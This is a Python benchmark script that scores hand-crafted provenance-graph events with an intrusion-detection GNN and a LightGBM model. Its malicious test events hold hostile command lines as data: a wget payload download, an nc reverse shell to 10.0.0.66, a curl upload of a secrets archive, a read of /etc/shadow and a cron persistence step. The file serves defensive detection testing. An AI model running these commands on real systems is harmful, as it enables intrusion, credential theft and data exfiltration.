"""Manual benchmark: hand-authored sysmon-style log -> both trained models.

Feeds 20 hand-crafted nodes (15 malicious / 5 benign) through the FULL FLASH
scoring path (prepare_graph -> Word2Vec embed -> explain-away) for BOTH the
GraphSAGE GNN (v2) and the LightGBMXT ablation, and prints per-node verdicts +
precision/recall for each.

Design (faithful to how the model really detects on E3):
- word2vec was trained on the benign 1r period -> benign tokens are in-vocab,
  attack tokens are OOV. So benign rows use REAL in-vocab Ubuntu command lines;
  malicious rows use OOV attack command lines (nc/wget/curl/crontab + /tmp/.*).
  A node whose tokens are all OOV embeds to ~zeros == "never seen in baseline".
- This is a SMALL-GRAPH smoke test. The explain-away confidence is min/max
  normalized over the batch, which is degenerate on 20 nodes -- so divergence
  from the E3 held-out numbers is expected and is itself diagnostic, not a model
  failure. Quantitative accuracy is claimed only on evaluate.py.

Raw DARPA data (for the optional BG_LINES background) is read from
THEIA_DATA_ROOT (default: <repo>/external/Flash-IDS).

  python benchmark.py
"""
from __future__ import annotations

import json
import os
import pickle
from pathlib import Path

import numpy as np
import pandas as pd
import torch
from gensim.models import Word2Vec

import theia_flash_common as fc

CODE_ROOT = Path(__file__).resolve().parent
DATA_ROOT = Path(os.environ.get("THEIA_DATA_ROOT",
                                CODE_ROOT.parents[2] / "external" / "Flash-IDS"))
device = torch.device("cpu")
GNN_W = CODE_ROOT / os.environ.get("THEIA_WEIGHTS", "trained_weights/theia_ours_v3")
LGBM_W = CODE_ROOT / os.environ.get("THEIA_LGBM", "trained_weights/theia_lgbm")
W2V = CODE_ROOT / "trained_weights/theia_ours_v3/word2vec_theia_E3.model"
THRESH = 0.53
# BG_LINES>0 injects a real E3 background population (from 6r.8) so the explain-
# away confidence normalization sees a realistic node distribution, mirroring the
# live pipeline (events accumulate into a graph; nodes scored within it).
BG_LINES = int(os.environ.get("BG_LINES", "0"))
TEST_SPLIT = str(DATA_ROOT / "ta1-theia-e3-official-6r.json.8")
TEST_TXT = DATA_ROOT / "theia_test.txt"

# --- hand-authored sysmon-style log: (actor, a_type, object, o_type, action, exec, path) ---
P, FILE, NET, MEM = "SUBJECT_PROCESS", "FILE_OBJECT_BLOCK", "NetFlowObject", "MemoryObject"
WGET = "wget http://10.0.0.66/stage2.sh -O /tmp/.x"
NC = "nc -e /bin/sh 10.0.0.66 4444"
CURL = "curl -T /home/admin/secret.tar.gz http://10.0.0.66/up"
FF = "/bin/bash -c /usr/bin/firefox"            # in-vocab
CRON = "/bin/sh -c    cd / && run-parts --report /etc/cron.hourly"  # in-vocab
SSHD = "/usr/sbin/sshd -D -R"                   # in-vocab

EVENTS = [
    # --- malicious: staged intrusion (OOV attack command lines) ---
    ("m_dropper", P, "ms_dl", NET, "EVENT_CONNECT", WGET, ""),
    ("m_dropper", P, "mf_stage2", FILE, "EVENT_WRITE", WGET, "/tmp/.x"),
    ("m_dropper", P, "m_stage2", P, "EVENT_EXECUTE", "bash /tmp/.x", ""),
    ("m_stage2", P, "m_revshell", P, "EVENT_CLONE", NC, ""),
    ("m_revshell", P, "ms_c2", NET, "EVENT_CONNECT", NC, ""),
    ("m_revshell", P, "mf_payload", FILE, "EVENT_WRITE", NC, "/tmp/.payload"),
    ("m_revshell", P, "mm_inject", MEM, "EVENT_MMAP", NC, ""),
    ("m_stage2", P, "m_recon", P, "EVENT_CLONE", "cat /etc/shadow", ""),
    ("m_recon", P, "mf_shadow", FILE, "EVENT_READ", "cat /etc/shadow", "/etc/shadow"),
    ("m_stage2", P, "m_persist", P, "EVENT_CLONE", "crontab /tmp/.cronjob", ""),
    ("m_persist", P, "mf_cron", FILE, "EVENT_WRITE", "crontab /tmp/.cronjob",
     "/var/spool/cron/crontabs/root"),
    ("m_stage2", P, "m_exfil", P, "EVENT_CLONE", CURL, ""),
    ("m_exfil", P, "mf_secret", FILE, "EVENT_READ", CURL, "/home/admin/secret.tar.gz"),
    ("m_exfil", P, "ms_exfil", NET, "EVENT_SENDTO", CURL, ""),
    # --- benign baseline (in-vocab command lines) ---
    ("b_firefox", P, "bf_prefs", FILE, "EVENT_READ", FF, "/etc/firefox/prefs.js"),
    ("b_cron", P, "bf_prefs", FILE, "EVENT_OPEN", CRON, ""),
    ("b_sshd", P, "bs_ssh", NET, "EVENT_RECVFROM", SSHD, ""),
]
MALICIOUS = {"m_dropper", "ms_dl", "mf_stage2", "m_stage2", "m_revshell", "ms_c2",
             "mf_payload", "mm_inject", "m_recon", "mf_shadow", "m_persist", "mf_cron",
             "m_exfil", "mf_secret", "ms_exfil"}   # 15
BENIGN = {"b_firefox", "b_cron", "b_sshd", "bf_prefs", "bs_ssh"}  # 5


def background_df(max_lines):
    """Capped real-E3 background: first max_lines of edges + attributes from 6r.8.
    Gives the scorer a realistic node population without parsing the full 48GB."""
    rows = [l.split("\t") for l in
            TEST_TXT.read_text(encoding="utf-8", errors="ignore").split("\n")[:max_lines]]
    edf = pd.DataFrame(rows, columns=["actorID", "actor_type", "objectID",
                                      "object", "action", "timestamp"]).dropna()
    attrs = []
    with open(TEST_SPLIT, encoding="utf-8", errors="ignore") as f:
        for n, line in enumerate(f):
            if n >= max_lines * 6:
                break
            if "EVENT" not in line:
                continue
            x = json.loads(line)
            ev = x["datum"].get("com.bbn.tc.schema.avro.cdm18.Event")
            if not ev:
                continue
            g = lambda *ks: fc._dig(ev, ks)
            attrs.append({"actorID": g("subject", "com.bbn.tc.schema.avro.cdm18.UUID"),
                          "objectID": g("predicateObject", "com.bbn.tc.schema.avro.cdm18.UUID"),
                          "action": ev.get("type", ""), "timestamp": str(ev.get("timestampNanos", "")),
                          "exec": g("properties", "map", "cmdLine"),
                          "path": g("predicateObjectPath", "string")})
    rdf = pd.DataFrame.from_records(attrs).astype(str)
    merged = edf.astype(str).merge(rdf, how="inner",
                                   on=["actorID", "objectID", "action", "timestamp"]).drop_duplicates()
    return merged[["actorID", "actor_type", "objectID", "object", "action", "exec", "path"]]


def conf_norm(margin):
    rng = margin.max() - margin.min()
    return (margin - margin.min()) / rng if rng > 0 else np.zeros_like(margin)


def score_gnn(X, y, edges, n_shards=20):
    g_x = torch.tensor(X, dtype=torch.float)
    g_ei = torch.tensor(edges, dtype=torch.long)
    yt = torch.tensor(y, dtype=torch.long)
    model = fc.GCN(fc.VECTOR_SIZE, 5)
    flag = np.ones(len(y), dtype=bool)
    last_pred, last_conf = np.zeros(len(y), int), np.zeros(len(y))
    for m in range(n_shards):
        sd = torch.load(GNN_W / f"lword2vec_gnn_theia{m}_E3.pth",
                        map_location=device, weights_only=True)
        model.load_state_dict(sd); model.eval()
        with torch.no_grad():
            out = model(g_x, g_ei)
        s, ind = out.sort(dim=1, descending=True)
        margin = ((s[:, 0] - s[:, 1]) / s[:, 0]).numpy()
        conf = conf_norm(margin)
        pred = ind[:, 0].numpy()
        flag &= ~((pred == y) & (conf > THRESH))
        last_pred, last_conf = pred, conf
    return flag, last_pred, last_conf


def score_lgbm(X, y):
    boosters = sorted(LGBM_W.glob("lgbm_xt_theia*_E3.pkl"),
                      key=lambda p: int(p.stem.split("theia")[1].split("_")[0]))
    flag = np.ones(len(y), dtype=bool)
    disp_pred, disp_conf = np.zeros(len(y), int), np.zeros(len(y))
    for bi, bp in enumerate(boosters):
        clf = pickle.load(open(bp, "rb"))
        proba = clf.predict_proba(X)
        s = np.sort(proba, axis=1)[:, ::-1]
        margin = (s[:, 0] - s[:, 1]) / np.clip(s[:, 0], 1e-9, None)
        conf = conf_norm(margin)
        pred = clf.classes_[proba.argmax(1)]
        flag &= ~((pred == y) & (conf > THRESH))
        if bi == 0:  # booster 0 is the real model; 1-2 trained on 2-3 residual nodes
            disp_pred, disp_conf = pred, conf
    return flag, disp_pred, disp_conf


def metrics(flag, mapp):
    tp = fp = fn = tn = 0
    for i, nid in enumerate(mapp):
        mal = nid in MALICIOUS
        flagged = bool(flag[i])
        tp += mal and flagged
        fp += (not mal) and flagged
        fn += mal and (not flagged)
        tn += (not mal) and (not flagged)
    prec = tp / (tp + fp) if tp + fp else 0
    rec = tp / (tp + fn) if tp + fn else 0
    f1 = 2 * prec * rec / (prec + rec) if prec + rec else 0
    return tp, fp, fn, tn, prec, rec, f1


def show(name, flag, pred, conf, mapp, y):
    print(f"\n===== {name} =====")
    print(f"  {'node':<12}{'type':<5}{'truth':<7}{'pred':<5}{'conf':<6}verdict")
    for i, nid in enumerate(mapp):
        if nid not in MALICIOUS and nid not in BENIGN:
            continue  # background population node — counted in metrics, not printed
        truth = "MAL" if nid in MALICIOUS else "ben"
        verdict = "FLAGGED" if flag[i] else "clean"
        print(f"  {nid:<12}{y[i]:<5}{truth:<7}{int(pred[i]):<5}{conf[i]:<6.2f}{verdict}")
    tp, fp, fn, tn, prec, rec, f1 = metrics(flag, mapp)
    print(f"  -> TP={tp} FP={fp} FN={fn} TN={tn}  precision={prec:.3f} "
          f"recall={rec:.3f} F1={f1:.3f}")


def main():
    syn_df = pd.DataFrame(EVENTS, columns=["actorID", "actor_type", "objectID",
                                           "object", "action", "exec", "path"]).astype(str)
    if BG_LINES > 0:
        bg = background_df(BG_LINES)
        print(f"background: {len(bg):,} real E3 edges injected (BG_LINES={BG_LINES})")
        df = pd.concat([bg, syn_df], ignore_index=True)
    else:
        df = syn_df
    phrases, labels, edges, mapp = fc.prepare_graph(df)
    w2v = Word2Vec.load(str(W2V))
    enc = fc.PositionalEncoder()
    X = np.array([fc.infer(p, w2v, enc) for p in phrases])
    y = np.array(labels)

    all_tok = {t for doc in phrases for t in doc}
    oov = {t for t in all_tok if t not in w2v.wv}
    syn_zero = [mapp[i] for i in range(len(phrases))
                if (mapp[i] in MALICIOUS or mapp[i] in BENIGN)
                and not any(t in w2v.wv for t in phrases[i])]
    print(f"nodes={len(mapp)} (synthetic MAL={len(MALICIOUS)} ben={len(BENIGN)})  "
          f"tokens={len(all_tok)} OOV={len(oov)}")
    print(f"synthetic all-OOV (zero-embedding) nodes: {len(syn_zero)} -> {syn_zero}")

    fg, pg, cg = score_gnn(X, y, edges)
    show("GraphSAGE GNN (v2)", fg, pg, cg, mapp, y)
    fl, pl, cl = score_lgbm(X, y)
    show("LightGBMXT", fl, pl, cl, mapp, y)
    print("\nNOTE: 20-node smoke test; batch conf-normalization is degenerate at "
          "this scale. Diagnostic, not an accuracy claim (see evaluate.py).")


if __name__ == "__main__":
    main()
